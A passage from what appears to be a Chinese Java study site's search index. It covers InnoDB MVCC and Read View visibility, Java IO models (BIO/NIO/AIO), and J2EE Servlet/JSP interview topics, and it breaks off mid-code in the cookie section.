Nonlocking Reads） 的实现，通常做法是加一个版本号或者时间戳字段，在更新数据的同时版本号 + 1 或者更新时间戳。查询时，将当前可见的版本号与对应记录的版本号进行比对，如果记录的版本小于可见版本，则表示该记录可见\n在 InnoDB 存储引擎中，多版本控制 (multi versioning) 就是对非锁定读的实现。如果读取的行正在执行 DELETE 或 UPDATE 操作，这时读取操作不会去等待行上锁的释放。相反地，InnoDB 存储引擎会去读取行的一个快照数据，对于这种读取历史数据的方式，我们叫它快照读 (snapshot read)\n在 Repeatable Read 和 Read Committed 两个隔离级别下，如果是执行普通的 select 语句（不包括 select ... lock in share mode ,select ... for update）则会使用 一致性非锁定读（MVCC）。并且在 Repeatable Read 下 MVCC 实现了可重复读和防止部分幻读\n锁定读    如果执行的是下列语句，就是 锁定读（Locking Reads）\n select ... lock in share mode select ... for update insert、update、delete 操作  在锁定读下，读取的是数据的最新版本，这种读也被称为 当前读（current read）。锁定读会对读取到的记录加锁：\n  select ... lock in share mode：对记录加 S 锁，其它事务也可以加S锁，如果加 x 锁则会被阻塞\n  select ... for update、insert、update、delete：对记录加 X 锁，且其它事务不能加任何锁\n  在一致性非锁定读下，即使读取的记录已被其它事务加上 X 锁，这时记录也是可以被读取的，即读取的快照数据。上面说了，在 Repeatable Read 下 MVCC 防止了部分幻读，这边的 “部分” 是指在 一致性非锁定读 情况下，只能读取到第一次查询之前所插入的数据（根据 Read View 判断数据可见性，Read View 在第一次查询时生成）。但是！如果是 当前读 ，每次读取的都是最新数据，这时如果两次查询中间有其它事务插入数据，就会产生幻读。所以， InnoDB 在实现Repeatable Read 时，如果执行的是当前读，则会对读取的记录使用 Next-key Lock ，来防止其它事务在间隙间插入数据\nInnoDB 对 MVCC 的实现    MVCC 的实现依赖于：隐藏字段、Read View、undo log。在内部实现中，InnoDB 通过数据行的 DB_TRX_ID 和 Read View 来判断数据的可见性，如不可见，则通过数据行的 DB_ROLL_PTR 找到 undo log 中的历史版本。每个事务读到的数据版本可能是不一样的，在同一个事务中，用户只能看到该事务创建 Read View 之前已经提交的修改和该事务本身做的修改\n隐藏字段    在内部，InnoDB 存储引擎为每行数据添加了三个 隐藏字段：\n DB_TRX_ID（6字节）：表示最后一次插入或更新该行的事务 id。此外，delete 操作在内部被视为更新，只不过会在记录头 Record header 中的 deleted_flag 字段将其标记为已删除 DB_ROLL_PTR（7字节） 回滚指针，指向该行的 undo log 。如果该行未被更新，则为空 DB_ROW_ID（6字节）：如果没有设置主键且该表没有唯一非空索引时，InnoDB 会使用该 id 来生成聚簇索引  ReadView    class ReadView { /* ... */ private: trx_id_t m_low_limit_id; /* 大于等于这个 ID 的事务均不可见 */ trx_id_t m_up_limit_id; /* 小于这个 ID 的事务均可见 */ trx_id_t m_creator_trx_id; /* 创建该 Read View 的事务ID */ trx_id_t m_low_limit_no; /* 事务 Number, 小于该 Number 的 Undo Logs 均可以被 Purge */ ids_t m_ids; /* 创建 Read View 时的活跃事务列表 */ m_closed; /* 标记 Read View 是否 close */ } Read View 主要是用来做可见性判断，里面保存了 “当前对本事务不可见的其他活跃事务”\n主要有以下字段：\n m_low_limit_id：目前出现过的最大的事务 ID+1，即下一个将被分配的事务 ID。大于等于这个 ID 的数据版本均不可见 m_up_limit_id：活跃事务列表 m_ids 中最小的事务 ID，如果 m_ids 为空，则 m_up_limit_id 为 m_low_limit_id。小于这个 ID 的数据版本均可见 m_ids：Read View 创建时其他未提交的活跃事务 ID 列表。创建 Read View时，将当前未提交事务 ID 记录下来，后续即使它们修改了记录行的值，对于当前事务也是不可见的。m_ids 不包括当前事务自己和已提交的事务（正在内存中） m_creator_trx_id：创建该 Read View 的事务 ID  事务可见性示意图（图源）：\nundo-log    undo log 主要有两个作用：\n 当事务回滚时用于将数据恢复到修改前的样子 另一个作用是 MVCC ，当读取记录时，若该记录被其他事务占用或当前版本对该事务不可见，则可以通过 undo log 读取之前的版本数据，以此实现非锁定读  在 InnoDB 存储引擎中 undo log 分为两种： insert undo log 和 update undo log：\n insert undo log ：指在 insert 操作中产生的 undo log。因为 insert 操作的记录只对事务本身可见，对其他事务不可见，故该 undo log 可以在事务提交后直接删除。不需要进行 purge 操作  insert 时的数据初始状态：\nupdate undo log ：update 或 delete 操作中产生的 undo log。该 undo log可能需要提供 MVCC 机制，因此不能在事务提交时就进行删除。提交时放入 undo log 链表，等待 purge线程 进行最后的删除  数据第一次被修改时：\n数据第二次被修改时：\n不同事务或者相同事务的对同一记录行的修改，会使该记录行的 undo log 成为一条链表，链首就是最新的记录，链尾就是最早的旧记录。\n数据可见性算法    在 InnoDB 存储引擎中，创建一个新事务后，执行每个 select 语句前，都会创建一个快照（Read View），快照中保存了当前数据库系统中正处于活跃（没有 commit）的事务的 ID 号。其实简单的说保存的是系统中当前不应该被本事务看到的其他事务 ID 列表（即 m_ids）。当用户在这个事务中要读取某个记录行的时候，InnoDB 会将该记录行的 DB_TRX_ID 与 Read View 中的一些变量及当前事务 ID 进行比较，判断是否满足可见性条件\n具体的比较算法如下：图源\n  如果记录 DB_TRX_ID \u0026lt; m_up_limit_id，那么表明最新修改该行的事务（DB_TRX_ID）在当前事务创建快照之前就提交了，所以该记录行的值对当前事务是可见的\n  如果 DB_TRX_ID \u0026gt;= m_low_limit_id，那么表明最新修改该行的事务（DB_TRX_ID）在当前事务创建快照之后才修改该行，所以该记录行的值对当前事务不可见。跳到步骤 5\n  m_ids 为空，则表明在当前事务创建快照之前，修改该行的事务就已经提交了，所以该记录行的值对当前事务是可见的\n  如果 m_up_limit_id \u0026lt;= DB_TRX_ID \u0026lt; m_low_limit_id，表明最新修改该行的事务（DB_TRX_ID）在当前事务创建快照的时候可能处于“活动状态”或者“已提交状态”；所以就要对活跃事务列表 m_ids 进行查找（源码中是用的二分查找，因为是有序的）\n  如果在活跃事务列表 m_ids 中能找到 DB_TRX_ID，表明：① 在当前事务创建快照前，该记录行的值被事务 ID 为 DB_TRX_ID 的事务修改了，但没有提交；或者 ② 在当前事务创建快照后，该记录行的值被事务 ID 为 DB_TRX_ID 的事务修改了。这些情况下，这个记录行的值对当前事务都是不可见的。跳到步骤 5\n  在活跃事务列表中找不到，则表明“id 为 trx_id 的事务”在修改“该记录行的值”后，在“当前事务”创建快照前就已经提交了，所以记录行对当前事务可见\n    在该记录行的 DB_ROLL_PTR 指针所指向的 undo log 取出快照记录，用快照记录的 DB_TRX_ID 跳到步骤 1 重新开始判断，直到找到满足的快照版本或返回空\n  RC 和 RR 隔离级别下 MVCC 的差异    在事务隔离级别 RC 和 RR （InnoDB 存储引擎的默认事务隔离级别）下，InnoDB 存储引擎使用 MVCC（非锁定一致性读），但它们生成 Read View 的时机却不同\n 在 RC 隔离级别下的 每次select 查询前都生成一个Read View (m_ids 列表) 在 RR 隔离级别下只在事务开始后 第一次select 数据前生成一个Read View（m_ids 列表）  MVCC 解决不可重复读问题    虽然 RC 和 RR 都通过 MVCC 来读取快照数据，但由于 生成 Read View 时机不同，从而在 RR 级别下实现可重复读\n举个例子：\n在 RC 下 ReadView 生成情况      假设时间线来到 T4 ，那么此时数据行 id = 1 的版本链为：\n  由于 RC 级别下每次查询都会生成Read View ，并且事务 101、102 并未提交，此时 103 事务生成的 Read View 中活跃的事务 m_ids 为：[101,102] ，m_low_limit_id为：104，m_up_limit_id为：101，m_creator_trx_id 为：103\n 此时最新记录的 DB_TRX_ID 为 101，m_up_limit_id \u0026lt;= 101 \u0026lt; m_low_limit_id，所以要在 m_ids 列表中查找，发现 DB_TRX_ID 存在列表中，那么这个记录不可见 根据 DB_ROLL_PTR 找到 undo log 中的上一版本记录，上一条记录的 DB_TRX_ID 还是 101，不可见 继续找上一条 DB_TRX_ID为 1，满足 1 \u0026lt; m_up_limit_id，可见，所以事务 103 查询到数据为 name = 菜花   时间线来到 T6 ，数据的版本链为：\n  因为在 RC 级别下，重新生成 Read View，这时事务 101 已经提交，102 并未提交，所以此时 Read View 中活跃的事务 m_ids：[102] ，m_low_limit_id为：104，m_up_limit_id为：102，m_creator_trx_id为：103\n  此时最新记录的 DB_TRX_ID 为 102，m_up_limit_id \u0026lt;= 102 \u0026lt; m_low_limit_id，所以要在 m_ids 列表中查找，发现 DB_TRX_ID 存在列表中，那么这个记录不可见\n  根据 DB_ROLL_PTR 找到 undo log 中的上一版本记录，上一条记录的 DB_TRX_ID 为 101，满足 101 \u0026lt; m_up_limit_id，记录可见，所以在 T6 时间点查询到数据为 name = 李四，与时间 T4 查询到的结果不一致，不可重复读！\n  时间线来到 T9 ，数据的版本链为：  重新生成 Read View， 这时事务 101 和 102 都已经提交，所以 m_ids 为空，则 m_up_limit_id = m_low_limit_id = 104，最新版本事务 ID 为 102，满足 102 \u0026lt; m_low_limit_id，可见，查询结果为 name = 赵六\n 总结： 在 RC 隔离级别下，事务在每次查询开始时都会生成并设置新的 Read View，所以导致不可重复读\n 在 RR 下 ReadView 生成情况    在可重复读级别下，只会在事务开始后第一次读取数据时生成一个 Read View（m_ids 列表）\n 在 T4 情况下的版本链为：  在当前执行 select 语句时生成一个 Read View，此时 m_ids：[101,102] ，m_low_limit_id为：104，m_up_limit_id为：101，m_creator_trx_id 为：103\n此时和 RC 级别下一样：\n 最新记录的 DB_TRX_ID 为 101，m_up_limit_id \u0026lt;= 101 \u0026lt; m_low_limit_id，所以要在 m_ids 列表中查找，发现 DB_TRX_ID 存在列表中，那么这个记录不可见 根据 DB_ROLL_PTR 找到 undo log 中的上一版本记录，上一条记录的 DB_TRX_ID 还是 101，不可见 继续找上一条 DB_TRX_ID为 1，满足 1 \u0026lt; m_up_limit_id，可见，所以事务 103 查询到数据为 name = 菜花   时间点 T6 情况下：\n在 RR 级别下只会生成一次Read View，所以此时依然沿用 m_ids ：[101,102] ，m_low_limit_id为：104，m_up_limit_id为：101，m_creator_trx_id 为：103\n    最新记录的 DB_TRX_ID 为 102，m_up_limit_id \u0026lt;= 102 \u0026lt; m_low_limit_id，所以要在 m_ids 列表中查找，发现 DB_TRX_ID 存在列表中，那么这个记录不可见\n  根据 DB_ROLL_PTR 找到 undo log 中的上一版本记录，上一条记录的 DB_TRX_ID 为 101，不可见\n  继续根据 DB_ROLL_PTR 找到 undo log 中的上一版本记录，上一条记录的 DB_TRX_ID 还是 101，不可见\n  继续找上一条 DB_TRX_ID为 1，满足 1 \u0026lt; m_up_limit_id，可见，所以事务 103 查询到数据为 name = 菜花\n  时间点 T9 情况下：  此时情况跟 T6 完全一样，由于已经生成了 Read View，此时依然沿用 m_ids ：[101,102] ，所以查询结果依然是 name = 菜花\nMVCC➕Next-key-Lock 防止幻读    InnoDB存储引擎在 RR 级别下通过 MVCC和 Next-key Lock 来解决幻读问题：\n1、执行普通 select，此时会以 MVCC 快照读的方式读取数据\n在快照读的情况下，RR 隔离级别只会在事务开启后的第一次查询生成 Read View ，并使用至事务提交。所以在生成 Read View 之后其它事务所做的更新、插入记录版本对当前事务并不可见，实现了可重复读和防止快照读下的 “幻读”\n2、执行 select\u0026hellip;for update/lock in share mode、insert、update、delete 等当前读\n在当前读下，读取的都是最新的数据，如果其它事务有插入新的记录，并且刚好在当前事务查询范围内，就会产生幻读！InnoDB 使用 Next-key Lock 来防止这种情况。当执行当前读时，会锁定读取到的记录的同时，锁定它们的间隙，防止其它事务在查询范围内插入数据。只要我不让你插入，就不会发生幻读\n参考     《MySQL 技术内幕 InnoDB 存储引擎第 2 版》 Innodb 中的事务隔离级别和锁的关系 MySQL 事务与 MVCC 如何实现的隔离级别 InnoDB 事务分析-MVCC  "},{"id":208,"href":"/java/basis/IO%E6%A8%A1%E5%9E%8B/","title":"IO模型","parent":"basis","content":"IO 模型这块确实挺难理解的，需要太多计算机底层知识。写这篇文章用了挺久，就非常希望能把我所知道的讲出来吧!希望朋友们能有收获！为了写这篇文章，还翻看了一下《UNIX 网络编程》这本书，太难了，我滴乖乖！心痛~\n个人能力有限。如果文章有任何需要补充/完善/修改的地方，欢迎在评论区指出，共同进步！\n前言    I/O 一直是很多小伙伴难以理解的一个知识点，这篇文章我会将我所理解的 I/O 讲给你听，希望可以对你有所帮助。\nI/O    何为 I/O?    I/O（Input/Outpu） 即输入／输出 。\n我们先从计算机结构的角度来解读一下 I/O。\n根据冯.诺依曼结构，计算机结构分为 5 大部分：运算器、控制器、存储器、输入设备、输出设备。\n输入设备（比如键盘）和输出设备（比如显示器）都属于外部设备。网卡、硬盘这种既可以属于输入设备，也可以属于输出设备。\n输入设备向计算机输入数据，输出设备接收计算机输出的数据。\n从计算机结构的视角来看的话， I/O 描述了计算机系统与外部设备之间通信的过程。\n我们再先从应用程序的角度来解读一下 I/O。\n根据大学里学到的操作系统相关的知识：为了保证操作系统的稳定性和安全性，一个进程的地址空间划分为 用户空间（User space） 和 内核空间（Kernel space ） 。\n像我们平常运行的应用程序都是运行在用户空间，只有内核空间才能进行系统态级别的资源有关的操作，比如文件管理、进程通信、内存管理等等。也就是说，我们想要进行 IO 操作，一定是要依赖内核空间的能力。\n并且，用户空间的程序不能直接访问内核空间。\n当想要执行 IO 操作时，由于没有执行这些操作的权限，只能发起系统调用请求操作系统帮忙完成。\n因此，用户进程想要执行 IO 操作的话，必须通过 系统调用 来间接访问内核空间\n我们在平常开发过程中接触最多的就是 磁盘 IO（读写文件） 和 网络 IO（网络请求和响应）。\n从应用程序的视角来看的话，我们的应用程序对操作系统的内核发起 IO 调用（系统调用），操作系统负责的内核执行具体的 IO 操作。也就是说，我们的应用程序实际上只是发起了 IO 操作的调用而已，具体 IO 的执行是由操作系统的内核来完成的。\n当应用程序发起 I/O 调用后，会经历两个步骤：\n 内核等待 I/O 设备准备好数据 内核将数据从内核空间拷贝到用户空间。  有哪些常见的 IO 模型?    UNIX 系统下， IO 模型一共有 5 种： 同步阻塞 I/O、同步非阻塞 I/O、I/O 多路复用、信号驱动 I/O 和异步 I/O。\n这也是我们经常提到的 5 种 IO 模型。\nJava 中 3 种常见 IO 模型    BIO (Blocking I/O)    BIO 属于同步阻塞 IO 模型 。\n同步阻塞 IO 模型中，应用程序发起 read 调用后，会一直阻塞，直到内核把数据拷贝到用户空间。\n在客户端连接数量不高的情况下，是没问题的。但是，当面对十万甚至百万级连接的时候，传统的 BIO 模型是无能为力的。因此，我们需要一种更高效的 I/O 处理模型来应对更高的并发量。\nNIO (Non-blocking/New I/O)    Java 中的 NIO 于 Java 1.4 中引入，对应 java.nio 包，提供了 Channel , Selector，Buffer 等抽象。NIO 中的 N 可以理解为 Non-blocking，不单纯是 New。它支持面向缓冲的，基于通道的 I/O 操作方法。 对于高负载、高并发的（网络）应用，应使用 NIO 。\nJava 中的 NIO 可以看作是 I/O 多路复用模型。也有很多人认为，Java 中的 NIO 属于同步非阻塞 IO 模型。\n跟着我的思路往下看看，相信你会得到答案！\n我们先来看看 同步非阻塞 IO 模型。\n同步非阻塞 IO 模型中，应用程序会一直发起 read 调用，等待数据从内核空间拷贝到用户空间的这段时间里，线程依然是阻塞的，直到在内核把数据拷贝到用户空间。\n相比于同步阻塞 IO 模型，同步非阻塞 IO 模型确实有了很大改进。通过轮询操作，避免了一直阻塞。\n但是，这种 IO 模型同样存在问题：应用程序不断进行 I/O 系统调用轮询数据是否已经准备好的过程是十分消耗 CPU 资源的。\n这个时候，I/O 多路复用模型 就上场了。\nIO 多路复用模型中，线程首先发起 select 调用，询问内核数据是否准备就绪，等内核把数据准备好了，用户线程再发起 read 调用。read 调用的过程（数据从内核空间-\u0026gt;用户空间）还是阻塞的。\n 目前支持 IO 多路复用的系统调用，有 select，epoll 等等。select 系统调用，是目前几乎在所有的操作系统上都有支持\n select 调用 ：内核提供的系统调用，它支持一次查询多个系统调用的可用状态。几乎所有的操作系统都支持。 epoll 调用 ：linux 2.6 内核，属于 select 调用的增强版本，优化了 IO 的执行效率。   IO 多路复用模型，通过减少无效的系统调用，减少了对 CPU 资源的消耗。\nJava 中的 NIO ，有一个非常重要的选择器 ( Selector ) 的概念，也可以被称为 多路复用器。通过它，只需要一个线程便可以管理多个客户端连接。当客户端数据到了之后，才会为其服务。\nAIO (Asynchronous I/O)    AIO 也就是 NIO 2。Java 7 中引入了 NIO 的改进版 NIO 2,它是异步 IO 模型。\n异步 IO 是基于事件和回调机制实现的，也就是应用操作之后会直接返回，不会堵塞在那里，当后台处理完成，操作系统会通知相应的线程进行后续的操作。\n目前来说 AIO 的应用还不是很广泛。Netty 之前也尝试使用过 AIO，不过又放弃了。这是因为，Netty 使用了 AIO 之后，在 Linux 系统上的性能并没有多少提升。\n最后，来一张图，简单总结一下 Java 中的 BIO、NIO、AIO。\n参考     《深入拆解 Tomcat \u0026amp; Jetty》 如何完成一次 IO：https://llc687.top/post/如何完成一次-io/ 程序员应该这样理解 IO：https://www.jianshu.com/p/fa7bdc4f3de7 10 分钟看懂， Java NIO 底层原理：https://www.cnblogs.com/crazymakercircle/p/10225159.html IO 模型知多少 | 理论篇：https://www.cnblogs.com/sheng-jie/p/how-much-you-know-about-io-models.html 《UNIX 网络编程 卷 1；套接字联网 API 》6.2 节 IO 模型  "},{"id":209,"href":"/java/J2EE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","title":"J2EE基础知识","parent":"java","content":"点击关注公众号及时获取笔主最新更新文章，并可免费领取本文档配套的《Java面试突击》以及Java工程师必备学习资源。\n Servlet总结 阐述Servlet和CGI的区别?  CGI的不足之处: Servlet的优点：   Servlet接口中有哪些方法及Servlet生命周期探秘 get和post请求的区别 什么情况下调用doGet()和doPost() 转发（Forward）和重定向（Redirect）的区别 自动刷新(Refresh) Servlet与线程安全 JSP和Servlet是什么关系 JSP工作原理 JSP有哪些内置对象、作用分别是什么 Request对象的主要方法有哪些 request.getAttribute()和 request.getParameter()有何区别 include指令include的行为的区别 JSP九大内置对象，七大动作，三大指令 讲解JSP中的四种作用域 如何实现JSP或Servlet的单线程模式 实现会话跟踪的技术有哪些 Cookie和Session的的区别  Servlet总结    在Java Web程序中，Servlet主要负责接收用户请求 HttpServletRequest,在doGet(),doPost()中做相应的处理，并将回应HttpServletResponse反馈给用户。Servlet 可以设置初始化参数，供Servlet内部使用。一个Servlet类只会有一个实例，在它初始化时调用init()方法，销毁时调用destroy()方法**。**Servlet需要在web.xml中配置（MyEclipse中创建Servlet会自动配置），**一个Servlet可以设置多个URL访问**。**Servlet不是线程安全**，因此要谨慎使用类变量。\n阐述Servlet和CGI的区别?    CGI的不足之处:    1，需要为每个请求启动一个操作CGI程序的系统进程。如果请求频繁，这将会带来很大的开销。\n2，需要为每个请求加载和运行一个CGI程序，这将带来很大的开销\n3，需要重复编写处理网络协议的代码以及编码，这些工作都是非常耗时的。\nServlet的优点:    1，只需要启动一个操作系统进程以及加载一个JVM，大大降低了系统的开销\n2，如果多个请求需要做同样处理的时候，这时候只需要加载一个类，这也大大降低了开销\n3，所有动态加载的类可以实现对网络协议以及请求解码的共享，大大降低了工作量。\n4，Servlet能直接和Web服务器交互，而普通的CGI程序不能。Servlet还能在各个程序之间共享数据，使数据库连接池之类的功能很容易实现。\n补充：Sun Microsystems公司在1996年发布Servlet技术就是为了和CGI进行竞争，Servlet是一个特殊的Java程序，一个基于Java的Web应用通常包含一个或多个Servlet类。Servlet不能够自行创建并执行，它是在Servlet容器中运行的，容器将用户的请求传递给Servlet程序，并将Servlet的响应回传给用户。通常一个Servlet会关联一个或多个JSP页面。以前CGI经常因为性能开销上的问题被诟病，然而Fast CGI早就已经解决了CGI效率上的问题，所以面试的时候大可不必信口开河的诟病CGI，事实上有很多你熟悉的网站都使用了CGI技术。\n参考：《javaweb整合开发王者归来》P7\nServlet接口中有哪些方法及Servlet生命周期探秘    Servlet接口定义了5个方法，其中前三个方法与Servlet生命周期相关：\n void init(ServletConfig config) throws ServletException void service(ServletRequest req, ServletResponse resp) throws ServletException, java.io.IOException void destroy() java.lang.String getServletInfo() ServletConfig getServletConfig()  生命周期： Web容器加载Servlet并将其实例化后，Servlet生命周期开始，容器运行其init()方法进行Servlet的初始化；请求到达时调用Servlet的service()方法，service()方法会根据需要调用与请求对应的doGet或doPost等方法；当服务器关闭或项目被卸载时服务器会将Servlet实例销毁，此时会调用Servlet的destroy()方法。init方法和destroy方法只会执行一次，service方法客户端每次请求Servlet都会执行。Servlet中有时会用到一些需要初始化与销毁的资源，因此可以把初始化资源的代码放入init方法中，销毁资源的代码放入destroy方法中，这样就不需要每次处理客户端的请求都要初始化与销毁资源。\n参考：《javaweb整合开发王者归来》P81\nget和post请求的区别    get和post请求实际上是没有区别，大家可以自行查询相关文章（参考文章：https://www.cnblogs.com/logsharing/p/8448446.html，知乎对应的问题链接：get和post区别？）！\n可以把 get 和 post 当作两个不同的行为，两者并没有什么本质区别，底层都是 TCP 连接。 get请求用来从服务器上获得资源，而post是用来向服务器提交数据。比如你要获取人员列表可以用 get 请求，你需要创建一个人员可以用 post 。这也是 Restful API 最基本的一个要求。\n推荐阅读：\n https://www.zhihu.com/question/28586791 https://mp.weixin.qq.com/s?__biz=MzI3NzIzMzg3Mw==\u0026amp;mid=100000054\u0026amp;idx=1\u0026amp;sn=71f6c214f3833d9ca20b9f7dcd9d33e4#rd  什么情况下调用doGet()和doPost()    Form标签里的method的属性为get时调用doGet()，为post时调用doPost()。\n转发(Forward)和重定向(Redirect)的区别    转发是服务器行为，重定向是客户端行为。\n转发（Forward） 通过RequestDispatcher对象的forward（HttpServletRequest request,HttpServletResponse response）方法实现的。RequestDispatcher可以通过HttpServletRequest 的getRequestDispatcher()方法获得。例如下面的代码就是跳转到login_success.jsp页面。\nrequest.getRequestDispatcher(\u0026#34;login_success.jsp\u0026#34;).forward(request, response); 重定向（Redirect） 是利用服务器返回的状态码来实现的。客户端浏览器请求服务器的时候，服务器会返回一个状态码。服务器通过 HttpServletResponse 的 setStatus(int status) 方法设置状态码。如果服务器返回301或者302，则浏览器会到新的网址重新请求该资源。\n 从地址栏显示来说  forward是服务器请求资源,服务器直接访问目标地址的URL,把那个URL的响应内容读取过来,然后把这些内容再发给浏览器.浏览器根本不知道服务器发送的内容从哪里来的,所以它的地址栏还是原来的地址. redirect是服务端根据逻辑,发送一个状态码,告诉浏览器重新去请求那个地址.所以地址栏显示的是新的URL.\n从数据共享来说  forward:转发页面和转发到的页面可以共享request里面的数据. redirect:不能共享数据.\n从运用地方来说  forward:一般用于用户登陆的时候,根据角色转发到相应的模块. redirect:一般用于用户注销登陆时返回主页面和跳转到其它的网站等\n从效率来说  forward:高. redirect:低.\n自动刷新(Refresh)    自动刷新不仅可以实现一段时间之后自动跳转到另一个页面，还可以实现一段时间之后自动刷新本页面。Servlet中通过HttpServletResponse对象设置Header属性实现自动刷新例如：\nResponse.setHeader(\u0026#34;Refresh\u0026#34;,\u0026#34;5;URL=http://localhost:8080/servlet/example.htm\u0026#34;); 其中5为时间，单位为秒。URL指定就是要跳转的页面（如果设置自己的路径，就会实现每过5秒自动刷新本页面一次）\nServlet与线程安全    Servlet不是线程安全的，多线程并发的读写会导致数据不同步的问题。 解决的办法是尽量不要定义name属性，而是要把name变量分别定义在doGet()和doPost()方法内。虽然使用synchronized(name){}语句块可以解决问题，但是会造成线程的等待，不是很科学的办法。 注意：多线程的并发的读写Servlet类属性会导致数据不同步。但是如果只是并发地读取属性而不写入，则不存在数据不同步的问题。因此Servlet里的只读属性最好定义为final类型的。\n参考：《javaweb整合开发王者归来》P92\nJSP和Servlet是什么关系    其实这个问题在上面已经阐述过了，Servlet是一个特殊的Java程序，它运行于服务器的JVM中，能够依靠服务器的支持向浏览器提供显示内容。JSP本质上是Servlet的一种简易形式，JSP会被服务器处理成一个类似于Servlet的Java程序，可以简化页面内容的生成。Servlet和JSP最主要的不同点在于，Servlet的应用逻辑是在Java文件中，并且完全从表示层中的HTML分离开来。而JSP的情况是Java和HTML可以组合成一个扩展名为.jsp的文件。有人说，Servlet就是在Java中写HTML，而JSP就是在HTML中写Java代码，当然这个说法是很片面且不够准确的。JSP侧重于视图，Servlet更侧重于控制逻辑，在MVC架构模式中，JSP适合充当视图（view）而Servlet适合充当控制器（controller）。\nJSP工作原理    JSP是一种Servlet，但是与HttpServlet的工作方式不太一样。HttpServlet是先由源代码编译为class文件后部署到服务器下，为先编译后部署。而JSP则是先部署后编译。JSP会在客户端第一次请求JSP文件时被编译为HttpJspPage类（接口Servlet的一个子类）。该类会被服务器临时存放在服务器工作目录里面。下面通过实例给大家介绍。 工程JspLoginDemo下有一个名为login.jsp的Jsp文件，把工程第一次部署到服务器上后访问这个Jsp文件，我们发现这个目录下多了下图这两个东东。 .class文件便是JSP对应的Servlet。编译完毕后再运行class文件来响应客户端请求。以后客户端访问login.jsp的时候，Tomcat将不再重新编译JSP文件，而是直接调用class文件来响应客户端请求。 由于JSP只会在客户端第一次请求的时候被编译 ，因此第一次请求JSP时会感觉比较慢，之后就会感觉快很多。如果把服务器保存的class文件删除，服务器也会重新编译JSP。\n开发Web程序时经常需要修改JSP。Tomcat能够自动检测到JSP程序的改动。如果检测到JSP源代码发生了改动。Tomcat会在下次客户端请求JSP时重新编译JSP，而不需要重启Tomcat。这种自动检测功能是默认开启的，检测改动会消耗少量的时间，在部署Web应用的时候可以在web.xml中将它关掉。\n参考：《javaweb整合开发王者归来》P97\nJSP有哪些内置对象、作用分别是什么    JSP内置对象 - CSDN博客 \nJSP有9个内置对象：\n request：封装客户端的请求，其中包含来自GET或POST请求的参数； response：封装服务器对客户端的响应； pageContext：通过该对象可以获取其他对象； session：封装用户会话的对象； application：封装服务器运行环境的对象； out：输出服务器响应的输出流对象； config：Web应用的配置对象； page：JSP页面本身（相当于Java程序中的this）； exception：封装页面抛出异常的对象。  Request对象的主要方法有哪些     setAttribute(String name,Object)：设置名字为name的request 的参数值 getAttribute(String name)：返回由name指定的属性值 getAttributeNames()：返回request 对象所有属性的名字集合，结果是一个枚举的实例 getCookies()：返回客户端的所有 Cookie 对象，结果是一个Cookie 数组 getCharacterEncoding() ：返回请求中的字符编码方式 = getContentLength() ：返回请求的 Body的长度 getHeader(String name) ：获得HTTP协议定义的文件头信息 getHeaders(String name) ：返回指定名字的request Header 的所有值，结果是一个枚举的实例 getHeaderNames() ：返回所以request Header 的名字，结果是一个枚举的实例 getInputStream() ：返回请求的输入流，用于获得请求中的数据 getMethod() ：获得客户端向服务器端传送数据的方法 getParameter(String name) ：获得客户端传送给服务器端的有 name指定的参数值 getParameterNames() ：获得客户端传送给服务器端的所有参数的名字，结果是一个枚举的实例 getParameterValues(String name)：获得有name指定的参数的所有值 getProtocol()：获取客户端向服务器端传送数据所依据的协议名称 getQueryString() ：获得查询字符串 getRequestURI() ：获取发出请求字符串的客户端地址 getRemoteAddr()：获取客户端的 IP 地址 getRemoteHost() ：获取客户端的名字 getSession([Boolean create]) ：返回和请求相关 Session getServerName() ：获取服务器的名字 getServletPath()：获取客户端所请求的脚本文件的路径 getServerPort()：获取服务器的端口号 removeAttribute(String name)：删除请求中的一个属性  request.getAttribute()和 request.getParameter()有何区别    从获取方向来看：\ngetParameter()是获取 POST/GET 传递的参数值；\ngetAttribute()是获取对象容器中的数据值；\n从用途来看：\ngetParameter()用于客户端重定向时，即点击了链接或提交按扭时传值用，即用于在用表单或url重定向传值时接收数据用。\ngetAttribute() 用于服务器端重定向时，即在 sevlet 中使用了 forward 函数,或 struts 中使用了 mapping.findForward。 getAttribute 只能收到程序用 setAttribute 传过来的值。\n另外，可以用 setAttribute(),getAttribute() 发送接收对象.而 getParameter() 显然只能传字符串。 setAttribute() 是应用服务器把这个对象放在该页面所对应的一块内存中去，当你的页面服务器重定向到另一个页面时，应用服务器会把这块内存拷贝另一个页面所对应的内存中。这样getAttribute()就能取得你所设下的值，当然这种方法可以传对象。session也一样，只是对象在内存中的生命周期不一样而已。getParameter()只是应用服务器在分析你送上来的 request页面的文本时，取得你设在表单或 url 重定向时的值。\n总结：\ngetParameter()返回的是String,用于读取提交的表单中的值;（获取之后会根据实际需要转换为自己需要的相应类型，比如整型，日期类型啊等等）\ngetAttribute()返回的是Object，需进行转换,可用setAttribute()设置成任意对象，使用很灵活，可随时用\ninclude指令include的行为的区别    include指令： JSP可以通过include指令来包含其他文件。被包含的文件可以是JSP文件、HTML文件或文本文件。包含的文件就好像是该JSP文件的一部分，会被同时编译执行。 语法格式如下： \u0026lt;%@ include file=\u0026ldquo;文件相对 url 地址\u0026rdquo; %\u0026gt;\ninclude动作： \u0026lt;jsp:include\u0026gt;动作元素用来包含静态和动态的文件。该动作把指定文件插入正在生成的页面。语法格式如下： \u0026lt;jsp:include page=\u0026ldquo;相对 URL 地址\u0026rdquo; flush=\u0026ldquo;true\u0026rdquo; /\u0026gt;\nJSP九大内置对象，七大动作，三大指令    JSP九大内置对象，七大动作，三大指令总结\n讲解JSP中的四种作用域    JSP中的四种作用域包括page、request、session和application，具体来说：\n page代表与一个页面相关的对象和属性。 request代表与Web客户机发出的一个请求相关的对象和属性。一个请求可能跨越多个页面，涉及多个Web组件；需要在页面显示的临时数据可以置于此作用域。 session代表与某个用户与服务器建立的一次会话相关的对象和属性。跟某个用户相关的数据应该放在用户自己的session中。 application代表与整个Web应用程序相关的对象和属性，它实质上是跨越整个Web应用程序，包括多个页面、请求和会话的一个全局作用域。  如何实现JSP或Servlet的单线程模式    对于JSP页面，可以通过page指令进行设置。 \u0026lt;%@page isThreadSafe=\u0026quot;false\u0026quot;%\u0026gt;\n对于Servlet，可以让自定义的Servlet实现SingleThreadModel标识接口。\n说明：如果将JSP或Servlet设置成单线程工作模式，会导致每个请求创建一个Servlet实例，这种实践将导致严重的性能问题（服务器的内存压力很大，还会导致频繁的垃圾回收），所以通常情况下并不会这么做。\n实现会话跟踪的技术有哪些     使用Cookie  向客户端发送Cookie\nCookie c =new 